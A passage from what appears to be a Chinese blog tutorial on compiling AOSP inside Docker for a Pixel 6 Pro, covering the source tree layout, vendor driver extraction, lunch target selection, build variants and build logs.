Runtime源码，包括Dalvik虚拟机和环境组件<br><span class="hljs-attribute">drwxr</span>-xr-x  <span class="hljs-number">14</span> root root  <span class="hljs-number">4096</span> Dec <span class="hljs-number">20</span> <span class="hljs-number">07</span>:<span class="hljs-number">08</span> bionic // android的C标准库(libc)实现<br><span class="hljs-attribute">drwxr</span>-xr-x   <span class="hljs-number">4</span> root root  <span class="hljs-number">4096</span> Dec <span class="hljs-number">20</span> <span class="hljs-number">07</span>:<span class="hljs-number">08</span> bootable // 包含可引导组件的源码，如recovery<br><span class="hljs-attribute">lrwxrwxrwx</span>   <span class="hljs-number">1</span> root root    <span class="hljs-number">26</span> Dec <span class="hljs-number">20</span> <span class="hljs-number">07</span>:<span class="hljs-number">08</span> bootstrap.bash -&gt; build/soong/bootstrap.bash<br><span class="hljs-attribute">drwxr</span>-xr-x  <span class="hljs-number">10</span> root root  <span class="hljs-number">4096</span> Dec <span class="hljs-number">20</span> <span class="hljs-number">07</span>:<span class="hljs-number">08</span> build // 包含构建系统的脚本和工具<br><span class="hljs-attribute">drwxr</span>-xr-x  <span class="hljs-number">14</span> root root  <span class="hljs-number">4096</span> Dec <span class="hljs-number">20</span> <span class="hljs-number">07</span>:<span class="hljs-number">08</span> cts  // 兼容性测试套件的源码<br><span class="hljs-attribute">drwxr</span>-xr-x   <span class="hljs-number">7</span> root root  <span class="hljs-number">4096</span> Dec <span class="hljs-number">20</span> <span class="hljs-number">07</span>:<span class="hljs-number">08</span> dalvik // 旧版的android java 虚拟机dalvik的源码<br><span class="hljs-attribute">drwxr</span>-xr-x   <span class="hljs-number">5</span> root root  <span class="hljs-number">4096</span> Dec <span class="hljs-number">20</span> <span class="hljs-number">07</span>:<span class="hljs-number">08</span> developers //<br><span class="hljs-attribute">drwxr</span>-xr-x  <span class="hljs-number">20</span> root root  <span class="hljs-number">4096</span> Dec <span class="hljs-number">20</span> <span class="hljs-number">07</span>:<span class="hljs-number">08</span> development // 包含一些开发和调试工具<br><span class="hljs-attribute">drwxr</span>-xr-x   <span class="hljs-number">9</span> root root  <span class="hljs-number">4096</span> Dec <span class="hljs-number">20</span> <span class="hljs-number">07</span>:<span class="hljs-number">08</span> device // 包含特定设备的配置和驱动代码<br><span class="hljs-attribute">drwxr</span>-xr-x <span class="hljs-number">409</span> root root <span class="hljs-number">16384</span> Dec <span class="hljs-number">20</span> <span class="hljs-number">07</span>:<span class="hljs-number">09</span> external //包含Android使用的外部开源库<br><span class="hljs-attribute">drwxr</span>-xr-x  <span class="hljs-number">16</span> root root  <span class="hljs-number">4096</span> Dec <span class="hljs-number">20</span> <span class="hljs-number">07</span>:<span class="hljs-number">10</span> frameworks // Android框架层的源码，这是Android系统的核心部分，包括服务管理、窗口管理、包管理等。<br><span class="hljs-attribute">drwxr</span>-xr-x  <span class="hljs-number">16</span> root root  <span class="hljs-number">4096</span> Dec <span class="hljs-number">20</span> <span class="hljs-number">07</span>:<span class="hljs-number">09</span> hardware // 硬件抽象层HAL的源码和一些硬件相关的代码<br><span class="hljs-attribute">drwxr</span>-xr-x   <span class="hljs-number">5</span> root root  <span class="hljs-number">4096</span> Dec <span class="hljs-number">20</span> <span class="hljs-number">07</span>:<span class="hljs-number">10</span> kernel // android Linux 内核的源码或预编译的二进制文件<br><span class="hljs-attribute">drwxr</span>-xr-x  <span class="hljs-number">20</span> root root  <span class="hljs-number">4096</span> Dec <span class="hljs-number">20</span> <span class="hljs-number">07</span>:<span class="hljs-number">10</span> libcore // java 核心库的Android实现<br><span class="hljs-attribute">drwxr</span>-xr-x   <span class="hljs-number">9</span> root root  <span class="hljs-number">4096</span> Dec <span class="hljs-number">20</span> <span class="hljs-number">07</span>:<span class="hljs-number">10</span> libnativehelper // android动态库，JNI库基础<br><span class="hljs-attribute">drwxr</span>-xr-x   <span class="hljs-number">9</span> root root  <span class="hljs-number">4096</span> Dec <span class="hljs-number">20</span> <span class="hljs-number">07</span>:<span class="hljs-number">10</span> packages // 包含一些android默认的应用程序，例如电话、设置等。<br><span class="hljs-attribute">drwxr</span>-xr-x   <span class="hljs-number">5</span> root root  <span class="hljs-number">4096</span> Dec <span class="hljs-number">20</span> <span class="hljs-number">07</span>:<span class="hljs-number">10</span> pdk <br><span class="hljs-attribute">drwxr</span>-xr-x  <span class="hljs-number">11</span> root root  <span class="hljs-number">4096</span> Dec <span class="hljs-number">20</span> <span class="hljs-number">07</span>:<span class="hljs-number">10</span> platform_testing<br><span class="hljs-attribute">drwxr</span>-xr-x  <span class="hljs-number">32</span> root root  <span class="hljs-number">4096</span> Dec <span class="hljs-number">20</span> <span class="hljs-number">07</span>:<span class="hljs-number">13</span> prebuilts  // 预编译的二进制文件，编译工具链<br><span class="hljs-attribute">drwxr</span>-xr-x  <span class="hljs-number">20</span> root root  <span class="hljs-number">4096</span> Dec <span class="hljs-number">20</span> <span class="hljs-number">07</span>:<span class="hljs-number">12</span> sdk        // Android SDK 的源码和相关工具<br><span class="hljs-attribute">drwxr</span>-xr-x  <span class="hljs-number">50</span> root root  <span class="hljs-number">4096</span> Dec <span class="hljs-number">20</span> <span class="hljs-number">07</span>:<span class="hljs-number">10</span> system     // android 系统的一些底层代码和守护进程<br><span class="hljs-attribute">drwxr</span>-xr-x  <span class="hljs-number">13</span> root root  <span class="hljs-number">4096</span> Dec <span class="hljs-number">20</span> <span class="hljs-number">07</span>:<span class="hljs-number">10</span> test<br><span class="hljs-attribute">drwxr</span>-xr-x   <span class="hljs-number">4</span> root root  <span class="hljs-number">4096</span> Dec <span class="hljs-number">20</span> <span class="hljs-number">07</span>:<span class="hljs-number">10</span> toolchain<br><span class="hljs-attribute">drwxr</span>-xr-x  <span class="hljs-number">29</span> root root  <span class="hljs-number">4096</span> Dec <span class="hljs-number">20</span> <span class="hljs-number">07</span>:<span class="hljs-number">10</span> tools   // 开发和构建工具<br></code></pre></td></tr></table></figure><p>linux内核文件使用的是prebuilts&#x2F;qemu-kernel&#x2F;arm&#x2F;kernel-qemu</p><p>这里特意指出Linux内核文件使用的是AOSP的probuilts目录下已有的，即表示linux内核文件并不是上面编译出来的。</p><h3 id="设备驱动"><a href="#设备驱动" class="headerlink" title="设备驱动"></a>设备驱动</h3><p>对应AOSP来说，光有AOSP 并不能很好的运行，还需要一些硬件相关的功能，因此还需要对应的设备驱动，</p><p><a href="https://developers.google.cn/android/drivers?hl=zh-cn">https://developers.google.cn/android/drivers?hl=zh-cn</a><br>找到对应的驱动文件，<br><img src="/12__%E5%9C%A8Docker%E5%86%85%E7%BC%96%E8%AF%91AOSP%E5%85%A8%E8%BF%87%E7%A8%8B.assets/image-20231227153844490.png"></p><p>把下载的压缩包解压后，将 extract-google_device-raven.sh 文件拷贝到下载的aosp源码目录中，<br><img src="/12__%E5%9C%A8Docker%E5%86%85%E7%BC%96%E8%AF%91AOSP%E5%85%A8%E8%BF%87%E7%A8%8B.assets/image-20231227154557057.png"></p><p>然后赋予权限，执行文件，按“d”翻页，输入 “I ACCEPT”。<br><img src="/12__%E5%9C%A8Docker%E5%86%85%E7%BC%96%E8%AF%91AOSP%E5%85%A8%E8%BF%87%E7%A8%8B.assets/image-20231227154721878.png"><br>解压完成后，会有一个vendor 文件夹，最后记得赋予vendor 权限<br>chmod -R 777 vendor&#x2F;</p><p>如果不加入vendor 设备驱动，那么最后在编译完成后，缺少vendor 和 radio.img 镜像，也没有bootloader镜像。<br>那么把extart-google_device-raven.sh 放到aosp中同步一下，然后重新编译，就有了。</p><h1 id="编译AOSP"><a href="#编译AOSP" class="headerlink" title="编译AOSP"></a>编译AOSP</h1><h2 id="设置环境"><a href="#设置环境" class="headerlink" title="设置环境"></a>设置环境</h2><p>source build&#x2F;envsetup.sh</p><h2 id="选择构建目标"><a href="#选择构建目标" class="headerlink" title="选择构建目标"></a>选择构建目标</h2><p>AOSP编译使用lunch l来选择要构建的目标，在官网中的解释如下：<br>使用 <code>lunch</code> 选择要构建的目标。<code>lunch product_name-build_variant</code> 会选择 product_name 作为需要构建的产品，并选择 build_variant 作为需要构建的变体，然后将这些选择存储在环境中，以便供后续对 <code>m</code> 和其他类似命令的调用读取。</p><p>在ASOP代码目录下直接执行 lunch 可以查看目标的menu。<br>如果执行lunch命令，报出“Warning: Cannot display lunch menu.” ，则需要root权限执行。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs markdown">root@4cd0e87f2387:~/aosp/4<span class="hljs-emphasis">_test# lunch</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">You&#x27;re building on Linux</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">Lunch menu .. Here are the common combinations:</span><br><span class="hljs-emphasis">     1. aosp_</span>arm-eng<br><span class="hljs-bullet">     2.</span> aosp<span class="hljs-emphasis">_arm64-eng</span><br><span class="hljs-emphasis">     3. aosp_</span>barbet-userdebug<br><span class="hljs-bullet">     4.</span> aosp<span class="hljs-emphasis">_bluejay-userdebug</span><br><span class="hljs-emphasis">     5. aosp_</span>bluejay<span class="hljs-emphasis">_car-userdebug</span><br><span class="hljs-emphasis">     6. aosp_</span>bramble-userdebug<br><span class="hljs-bullet">     7.</span> aosp<span class="hljs-emphasis">_bramble_</span>car-userdebug<br><span class="hljs-bullet">     8.</span> aosp<span class="hljs-emphasis">_car_</span>arm-userdebug<br><span class="hljs-bullet">     9.</span> aosp<span class="hljs-emphasis">_car_</span>arm64-userdebug<br><span class="hljs-bullet">     10.</span> aosp<span class="hljs-emphasis">_car_</span>x86-userdebug<br><span class="hljs-bullet">     11.</span> aosp<span class="hljs-emphasis">_car_</span>x86<span class="hljs-emphasis">_64-userdebug</span><br><span class="hljs-emphasis">     12. aosp_</span>cf<span class="hljs-emphasis">_arm64_</span>auto-userdebug<br><span class="hljs-bullet">     13.</span> aosp<span class="hljs-emphasis">_cf_</span>arm64<span class="hljs-emphasis">_phone-userdebug</span><br><span class="hljs-emphasis">     14. aosp_</span>cf<span class="hljs-emphasis">_x86_</span>64<span class="hljs-emphasis">_foldable-userdebug</span><br><span class="hljs-emphasis">     15. aosp_</span>cf<span class="hljs-emphasis">_x86_</span>64<span class="hljs-emphasis">_pc-userdebug</span><br><span class="hljs-emphasis">     16. aosp_</span>cf<span class="hljs-emphasis">_x86_</span>64<span class="hljs-emphasis">_phone-userdebug</span><br><span class="hljs-emphasis">     17. aosp_</span>cf<span class="hljs-emphasis">_x86_</span>64<span class="hljs-emphasis">_tv-userdebug</span><br><span class="hljs-emphasis">     18. aosp_</span>cf<span class="hljs-emphasis">_x86_</span>auto-userdebug<br><span class="hljs-bullet">     19.</span> aosp<span class="hljs-emphasis">_cf_</span>x86<span class="hljs-emphasis">_phone-userdebug</span><br><span class="hljs-emphasis">     20. aosp_</span>cf<span class="hljs-emphasis">_x86_</span>tv-userdebug<br><span class="hljs-bullet">     21.</span> aosp<span class="hljs-emphasis">_cheetah-userdebug</span><br><span class="hljs-emphasis">     22. aosp_</span>cloudripper-userdebug<br><span class="hljs-bullet">     23.</span> aosp<span class="hljs-emphasis">_coral-userdebug</span><br><span class="hljs-emphasis">     24. aosp_</span>coral<span class="hljs-emphasis">_car-userdebug</span><br><span class="hljs-emphasis">     25. aosp_</span>flame-userdebug<br><span class="hljs-bullet">     26.</span> aosp<span class="hljs-emphasis">_flame_</span>car-userdebug<br><span class="hljs-bullet">     27.</span> aosp<span class="hljs-emphasis">_oriole-userdebug</span><br><span class="hljs-emphasis">     28. aosp_</span>oriole<span class="hljs-emphasis">_car-userdebug</span><br><span class="hljs-emphasis">     29. aosp_</span>panther-userdebug<br><span class="hljs-bullet">     30.</span> aosp<span class="hljs-emphasis">_raven-userdebug</span><br><span class="hljs-emphasis">     31. aosp_</span>raven<span class="hljs-emphasis">_car-userdebug</span><br><span class="hljs-emphasis">     32. aosp_</span>ravenclaw-userdebug<br><span class="hljs-bullet">     33.</span> aosp<span class="hljs-emphasis">_redfin-userdebug</span><br><span class="hljs-emphasis">     34. aosp_</span>redfin<span class="hljs-emphasis">_car-userdebug</span><br><span class="hljs-emphasis">     35. aosp_</span>redfin<span class="hljs-emphasis">_vf-userdebug</span><br><span class="hljs-emphasis">     36. aosp_</span>slider-userdebug<br><span class="hljs-bullet">     37.</span> aosp<span class="hljs-emphasis">_sunfish-userdebug</span><br><span class="hljs-emphasis">     38. aosp_</span>sunfish<span class="hljs-emphasis">_car-userdebug</span><br><span class="hljs-emphasis">     39. aosp_</span>trout<span class="hljs-emphasis">_arm64-userdebug</span><br><span class="hljs-emphasis">     40. aosp_</span>trout<span class="hljs-emphasis">_x86-userdebug</span><br><span class="hljs-emphasis">     41. aosp_</span>whitefin-userdebug<br><span class="hljs-bullet">     42.</span> aosp<span class="hljs-emphasis">_x86-eng</span><br><span class="hljs-emphasis">     43. aosp_</span>x86<span class="hljs-emphasis">_64-eng</span><br><span class="hljs-emphasis">     44. arm_</span>krait-eng<br><span class="hljs-bullet">     45.</span> arm<span class="hljs-emphasis">_v7_</span>v8-eng<br><span class="hljs-bullet">     46.</span> armv8-eng<br><span class="hljs-bullet">     47.</span> armv8<span class="hljs-emphasis">_cortex_</span>a55-eng<br><span class="hljs-bullet">     48.</span> armv8<span class="hljs-emphasis">_kryo385-eng</span><br><span class="hljs-emphasis">     49. beagle_</span>x15-userdebug<br><span class="hljs-bullet">     50.</span> beagle<span class="hljs-emphasis">_x15_</span>auto-userdebug<br><span class="hljs-bullet">     51.</span> car<span class="hljs-emphasis">_ui_</span>portrait-userdebug<br><span class="hljs-bullet">     52.</span> car<span class="hljs-emphasis">_x86_</span>64-userdebug<br><span class="hljs-bullet">     53.</span> db845c-userdebug<br><span class="hljs-bullet">     54.</span> gsi<span class="hljs-emphasis">_car_</span>arm64-userdebug<br><span class="hljs-bullet">     55.</span> gsi<span class="hljs-emphasis">_car_</span>x86<span class="hljs-emphasis">_64-userdebug</span><br><span class="hljs-emphasis">     56. hikey-userdebug</span><br><span class="hljs-emphasis">     57. hikey64_</span>only-userdebug<br><span class="hljs-bullet">     58.</span> hikey960-userdebug<br><span class="hljs-bullet">     59.</span> hikey960<span class="hljs-emphasis">_tv-userdebug</span><br><span class="hljs-emphasis">     60. hikey_</span>tv-userdebug<br><span class="hljs-bullet">     61.</span> poplar-eng<br><span class="hljs-bullet">     62.</span> poplar-user<br><span class="hljs-bullet">     63.</span> poplar-userdebug<br><span class="hljs-bullet">     64.</span> qemu<span class="hljs-emphasis">_trusty_</span>arm64-userdebug<br><span class="hljs-bullet">     65.</span> rb5-userdebug<br><span class="hljs-bullet">     66.</span> sdk<span class="hljs-emphasis">_car_</span>arm-userdebug<br><span class="hljs-bullet">     67.</span> sdk<span class="hljs-emphasis">_car_</span>arm64-userdebug<br><span class="hljs-bullet">     68.</span> sdk<span class="hljs-emphasis">_car_</span>portrait<span class="hljs-emphasis">_x86_</span>64-userdebug<br><span class="hljs-bullet">     69.</span> sdk<span class="hljs-emphasis">_car_</span>x86-userdebug<br><span class="hljs-bullet">     70.</span> sdk<span class="hljs-emphasis">_car_</span>x86<span class="hljs-emphasis">_64-userdebug</span><br><span class="hljs-emphasis">     71. sdk_</span>pc<span class="hljs-emphasis">_x86_</span>64-userdebug<br><span class="hljs-bullet">     72.</span> silvermont-eng<br><span class="hljs-bullet">     73.</span> uml-userdebug<br><span class="hljs-bullet">     74.</span> yukawa-userdebug<br><span class="hljs-bullet">     75.</span> yukawa<span class="hljs-emphasis">_sei510-userdebug</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">Which would you like? [aosp_</span>arm-eng]<br>Pick from common choices above (e.g. 13) or specify your own (e.g. aosp<span class="hljs-emphasis">_barbet-eng):</span><br></code></pre></td></tr></table></figure><p>根据自己要构建的目标来选择对应的编号，其中的 user，userdebug，eng 之间的区别分别用于不同的使用场景。</p><ul><li>user：用来正式发布到市场的版本，权限受限，如没有 root 权限，不能 dedug，adb 默认处于停用状态。<ul><li>安装带有user 标记的模块</li><li>除了带有标记的模块之外，还会根据产品定义文件安装相应的模块</li><li>ro.secure&#x3D;1</li><li>ro.debuggable &#x3D; 0</li><li>adb 停用</li></ul></li><li>userdebug：在 user 版本的基础上开放了 root 权限和 debug 权限，adb 默认处于启用状态。一般用于调试真机。<ul><li>安装带有debug 标记地模块</li><li>ro.debuggable &#x3D; 1</li><li>adb 默认开启</li></ul></li><li>eng：开发工程师的版本，拥有最大的权限 (root 等)，具有额外调试工具的开发配置。一般用于模拟器</li></ul><p>由于pixel 6Pro 的代号是 raven， 所以我选择了aosp_raven-userdebug， 这里的代号其实是google 自己定义的，如何知道当前机型的代号，很容易可以获取，可以adb shell 查看。google android 文档也可以找到。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs gradle">Pick <span class="hljs-keyword">from</span> common choices above (e.g. <span class="hljs-number">13</span>) or specify your own (e.g. aosp_barbet-eng): <span class="hljs-number">30</span><br><span class="hljs-number">09</span>:<span class="hljs-number">15</span>:<span class="hljs-number">05</span> Build sandboxing disabled due to nsjail error.<br><span class="hljs-number">09</span>:<span class="hljs-number">15</span>:<span class="hljs-number">06</span> Build sandboxing disabled due to nsjail error.<br><br>Hint: <span class="hljs-keyword">next</span> time you can simply run <span class="hljs-string">&#x27;lunch aosp_raven-userdebug&#x27;</span><br><br>============================================<br>PLATFORM_VERSION_CODENAME=REL<br>PLATFORM_VERSION=<span class="hljs-number">13</span><br>TARGET_PRODUCT=aosp_raven<br>TARGET_BUILD_VARIANT=userdebug<br>TARGET_BUILD_TYPE=release<br>TARGET_ARCH=arm64<br>TARGET_ARCH_VARIANT=armv8-<span class="hljs-number">2</span>a<br>TARGET_CPU_VARIANT=cortex-a55<br>TARGET_2ND_ARCH=arm<br>TARGET_2ND_ARCH_VARIANT=armv8-a<br>TARGET_2ND_CPU_VARIANT=generic<br>HOST_ARCH=x86_64<br>HOST_2ND_ARCH=x86<br>HOST_OS=linux<br>HOST_OS_EXTRA=Linux-<span class="hljs-number">5.4</span>.<span class="hljs-number">0</span>-<span class="hljs-number">169</span>-generic-x86_64-Ubuntu-<span class="hljs-number">18.04</span>.<span class="hljs-number">6</span>-LTS<br>HOST_CROSS_OS=windows<br>HOST_CROSS_ARCH=x86<br>HOST_CROSS_2ND_ARCH=x86_64<br>HOST_BUILD_TYPE=release<br>BUILD_ID=TQ2A.<span class="hljs-number">230505.002</span><br>OUT_DIR=out<br>PRODUCT_SOONG_NAMESPACES=vendor<span class="hljs-regexp">/google_devices/</span>raven<span class="hljs-regexp">/proprietary device/g</span>oogle<span class="hljs-regexp">/gs-common/</span>powerstats hardware<span class="hljs-regexp">/google/g</span>chips<span class="hljs-regexp">/gralloc4 hardware/g</span>oogle<span class="hljs-regexp">/av hardware/g</span>oogle<span class="hljs-regexp">/gchips hardware/g</span>oogle<span class="hljs-regexp">/graphics/</span>common hardware<span class="hljs-regexp">/google/g</span>raphics<span class="hljs-regexp">/gs101 hardware/g</span>oogle<span class="hljs-regexp">/interfaces hardware/g</span>oogle<span class="hljs-regexp">/pixel device/g</span>oogle<span class="hljs-regexp">/gs101 device/g</span>oogle<span class="hljs-regexp">/gs101/</span>powerstats vendor<span class="hljs-regexp">/google/</span>whitechapel<span class="hljs-regexp">/tools vendor/</span>broadcom<span class="hljs-regexp">/bluetooth vendor/g</span>oogle<span class="hljs-regexp">/camera vendor/g</span>oogle<span class="hljs-regexp">/interfaces vendor/g</span>oogle_devices<span class="hljs-regexp">/common/</span>proprietary<span class="hljs-regexp">/confirmatioui_hal vendor/g</span>oogle_nos<span class="hljs-regexp">/host/</span>android vendor<span class="hljs-regexp">/google_nos/</span>test<span class="hljs-regexp">/system-test-harness vendor/</span>samsung_slsi<span class="hljs-regexp">/telephony/</span> vendor<span class="hljs-regexp">/arm/m</span>ali<span class="hljs-regexp">/valhall device/g</span>oogle<span class="hljs-regexp">/gs101/</span>conf vendor<span class="hljs-regexp">/samsung_slsi/</span>codec2 device<span class="hljs-regexp">/google/g</span>s101<span class="hljs-regexp">/gnss/</span><span class="hljs-number">47765</span> vendor<span class="hljs-regexp">/google/</span>trusty<span class="hljs-regexp">/common vendor/g</span>oogle<span class="hljs-regexp">/whitechapel/</span>audio<span class="hljs-regexp">/hal vendor/g</span>oogle<span class="hljs-regexp">/whitechapel/</span>audio<span class="hljs-regexp">/interfaces vendor/g</span>oogle<span class="hljs-regexp">/whitechapel/</span>aoc vendor<span class="hljs-regexp">/goodix/u</span>dfps<span class="hljs-regexp">/fp_utils vendor/g</span>oodix<span class="hljs-regexp">/udfps/g</span>6_trusty vendor<span class="hljs-regexp">/goodix/u</span>dfps<span class="hljs-regexp">/g6_aidl_trusty device/g</span>oogle<span class="hljs-regexp">/raviole/</span>powerstats<span class="hljs-regexp">/raven device/g</span>oogle<span class="hljs-regexp">/raviole vendor/g</span>oogle_devices<span class="hljs-regexp">/raviole/</span>prebuilts<br>============================================<br></code></pre></td></tr></table></figure><h2 id="开始编译"><a href="#开始编译" class="headerlink" title="开始编译"></a>开始编译</h2><p>正常来说，编译完成要一两个小时，所以建议在晚上睡觉之前编译，由于我的服务器的资源充足，所以编译只需要半个来小时，又因为之前已经编译过一次了，所以再次编译比之前要快很多。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs awk">root@<span class="hljs-number">4</span>cd0e87f2387:~<span class="hljs-regexp">/aosp/</span><span class="hljs-number">4</span>_test<span class="hljs-comment"># make</span><br><span class="hljs-number">09</span>:<span class="hljs-number">16</span>:<span class="hljs-number">40</span> Build sandboxing disabled due to nsjail error.<br>build<span class="hljs-regexp">/make/</span>core/soong_config.mk:<span class="hljs-number">209</span>: warning: BOARD_PLAT_PUBLIC_SEPOLICY_DIR has been deprecated. Use SYSTEM_EXT_PUBLIC_SEPOLICY_DIRS instead.<br>build<span class="hljs-regexp">/make/</span>core/soong_config.mk:<span class="hljs-number">210</span>: warning: BOARD_PLAT_PRIVATE_SEPOLICY_DIR has been deprecated. Use SYSTEM_EXT_PRIVATE_SEPOLICY_DIRS instead.<br>============================================<br>PLATFORM_VERSION_CODENAME=REL<br>PLATFORM_VERSION=<span class="hljs-number">13</span><br>TARGET_PRODUCT=aosp_raven<br>TARGET_BUILD_VARIANT=userdebug<br>TARGET_BUILD_TYPE=release<br>TARGET_ARCH=arm64<br>TARGET_ARCH_VARIANT=armv8-<span class="hljs-number">2</span>a<br>TARGET_CPU_VARIANT=cortex-a55<br>TARGET_2ND_ARCH=arm<br>TARGET_2ND_ARCH_VARIANT=armv8-a<br>TARGET_2ND_CPU_VARIANT=generic<br>HOST_ARCH=x86_64<br>HOST_2ND_ARCH=x86<br>HOST_OS=linux<br>HOST_OS_EXTRA=Linux-<span class="hljs-number">5.4</span>.<span class="hljs-number">0</span>-<span class="hljs-number">169</span>-generic-x86_64-Ubuntu-<span class="hljs-number">18.04</span>.<span class="hljs-number">6</span>-LTS<br>HOST_CROSS_OS=windows<br>HOST_CROSS_ARCH=x86<br>HOST_CROSS_2ND_ARCH=x86_64<br>HOST_BUILD_TYPE=release<br>BUILD_ID=TQ2A.<span class="hljs-number">230505.002</span><br>OUT_DIR=out<br>PRODUCT_SOONG_NAMESPACES=vendor<span class="hljs-regexp">/google_devices/</span>raven<span class="hljs-regexp">/proprietary device/g</span>oogle<span class="hljs-regexp">/gs-common/</span>powerstats hardware<span class="hljs-regexp">/google/g</span>chips<span class="hljs-regexp">/gralloc4 hardware/g</span>oogle<span class="hljs-regexp">/av hardware/g</span>oogle<span class="hljs-regexp">/gchips hardware/g</span>oogle<span class="hljs-regexp">/graphics/</span>common hardware<span class="hljs-regexp">/google/g</span>raphics<span class="hljs-regexp">/gs101 hardware/g</span>oogle<span class="hljs-regexp">/interfaces hardware/g</span>oogle<span class="hljs-regexp">/pixel device/g</span>oogle<span class="hljs-regexp">/gs101 device/g</span>oogle<span class="hljs-regexp">/gs101/</span>powerstats vendor<span class="hljs-regexp">/google/</span>whitechapel<span class="hljs-regexp">/tools vendor/</span>broadcom<span class="hljs-regexp">/bluetooth vendor/g</span>oogle<span class="hljs-regexp">/camera vendor/g</span>oogle<span class="hljs-regexp">/interfaces vendor/g</span>oogle_devices<span class="hljs-regexp">/common/</span>proprietary<span class="hljs-regexp">/confirmatioui_hal vendor/g</span>oogle_nos<span class="hljs-regexp">/host/</span>android vendor<span class="hljs-regexp">/google_nos/</span>test<span class="hljs-regexp">/system-test-harness vendor/</span>samsung_slsi<span class="hljs-regexp">/telephony/</span> vendor<span class="hljs-regexp">/arm/m</span>ali<span class="hljs-regexp">/valhall device/g</span>oogle<span class="hljs-regexp">/gs101/</span>conf vendor<span class="hljs-regexp">/samsung_slsi/</span>codec2 device<span class="hljs-regexp">/google/g</span>s101<span class="hljs-regexp">/gnss/</span><span class="hljs-number">47765</span> vendor<span class="hljs-regexp">/google/</span>trusty<span class="hljs-regexp">/common vendor/g</span>oogle<span class="hljs-regexp">/whitechapel/</span>audio<span class="hljs-regexp">/hal vendor/g</span>oogle<span class="hljs-regexp">/whitechapel/</span>audio<span class="hljs-regexp">/interfaces vendor/g</span>oogle<span class="hljs-regexp">/whitechapel/</span>aoc vendor<span class="hljs-regexp">/goodix/u</span>dfps<span class="hljs-regexp">/fp_utils vendor/g</span>oodix<span class="hljs-regexp">/udfps/g</span>6_trusty vendor<span class="hljs-regexp">/goodix/u</span>dfps<span class="hljs-regexp">/g6_aidl_trusty device/g</span>oogle<span class="hljs-regexp">/raviole/</span>powerstats<span class="hljs-regexp">/raven device/g</span>oogle<span class="hljs-regexp">/raviole vendor/g</span>oogle_devices<span class="hljs-regexp">/raviole/</span>prebuilts<br>============================================<br>$(shell uname -rsm) was changed, regenerating...<br>$(shell uname -rsm) was changed, regenerating...<br>[ <span class="hljs-number">90</span>% <span class="hljs-number">158</span><span class="hljs-regexp">/175] including system/</span>sepolicy/Android.mk ...<br>system<span class="hljs-regexp">/sepolicy/</span>Android.mk:<span class="hljs-number">57</span>: warning: BOARD_PLAT_PUBLIC_SEPOLICY_DIR has been deprecated. Use SYSTEM_EXT_PUBLIC_SEPOLICY_DIRS instead.<br>system<span class="hljs-regexp">/sepolicy/</span>Android.mk:<span class="hljs-number">62</span>: warning: BOARD_PLAT_PRIVATE_SEPOLICY_DIR has been deprecated. Use SYSTEM_EXT_PRIVATE_SEPOLICY_DIRS 